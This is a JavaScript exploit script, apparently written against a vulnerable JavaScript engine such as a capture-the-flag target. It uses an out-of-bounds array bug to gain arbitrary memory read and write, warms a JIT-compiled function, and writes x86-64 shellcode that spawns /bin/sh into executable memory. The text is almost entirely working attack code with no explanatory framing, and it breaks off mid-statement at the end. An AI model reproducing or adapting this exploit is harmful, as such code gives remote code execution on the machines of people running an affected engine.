//double to int
function d_to_i2(d){
         var a = new Uint32Array(new Float64Array([d]).buffer);
         return [a[1], a[0]];
 }
 
//int to double
 function i2_to_d(x){
     return new Float64Array(new Uint32Array([x[1], x[0]]).buffer)[0];
 }
 
function i2_to_hex(i2){
                var v1 = ("00000000" + i2[0].toString(16)).substr(-8);
                var v2 = ("00000000" + i2[1].toString(16)).substr(-8);
         return [v1,v2];
 }
 function p_i2(d){
        print(i2_to_hex(d_to_i2(d))[0]+i2_to_hex(d_to_i2(d))[1])
 
 }
 
function debug_log(x){
        return console.log("[DEBUG] "+x)
}
 
function hex(i2){
  return "0x" + ("00000000" + i2[0].toString(16)).slice(-8) + ("00000000" + i2[1].toString(16)).slice(-8);
}
 
var oob_Array=new Array(1)
oob_Array[0]=0x71717171
 
var uint32_Array=new Uint32Array(0x1000)
for(var i=0; i<0x1000; i=i+1) {uint32_Array[i]=0x4141414141}
 
 
//trigger oob
oob_Array.pop()
oob_Array.pop()
 
//find the function size tag(0x1337) from the oob array
uint32_baseaddress_offset=0
for (i=0; i<0x1337; i++)
{
        if(oob_Array[i]==0x1000)
        {
                print('uInt32Array found');
                uint32_baseaddress_offset=i+2
                break;
        }
}
// array address of the original object
// overwrite for arbitary oob
print("address of the buffer");
p_i2(oob_Array[uint32_baseaddress_offset]);
print("location : "+uint32_baseaddress_offset);

//jit 
function ss(arg){
  print('NO SHELL')
}
for (i=0; i<0x20; i++){
  ss(1)
}



//read memory content
function read64(addr){
        console.log(addr);
        oob_Array[uint32_baseaddress_offset]=i2_to_d(addr);
        // return the first two block of hex of the addr
        return [uint32_Array[1],uint32_Array[0]]
}
 
//write memory
function write4(addr,value){
        oob_Array[uint32_baseaddress_offset]=i2_to_d(addr);
        uint32_Array[0]=value[1];
        uint32_Array[1]=value[0];
}

function write(addr, data){
                oob_Array[uint32_baseaddress_offset] = i2_to_d(addr);
                uint32_Array[0] = data;
}

function read(addr){
                oob_Array[uint32_baseaddress_offset] = i2_to_d(addr);
                return uint32_Array[0]
}



function shellcodeInject(addr, shellcode){
        var hex = '';
        var shellcodeA=[]
        var c=0
        for(var i=0; i<shellcode.length;i=i+4)
        {
              for(var j=0; j<4; j++)
              {
                    if(shellcode[i+j]!=undefined)
                        hex+=("00"+shellcode.charCodeAt(i+j).toString(16, 2)).substr(-2)
              }
              shellcodeA[c]=parseInt('0x'+hex.match(/.{1,2}/g).reverse().join(''), 16)
              hex=''
              c=c+1
        }
        for(var i=0; i<shellcodeA.length; i=i+1)
        {
              addr[1]=addr[1]+4
              write(addr, shellcodeA[i])
        }
}

shellcode="\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05"



shellcodeInject(d_to_i2(oob_Array[
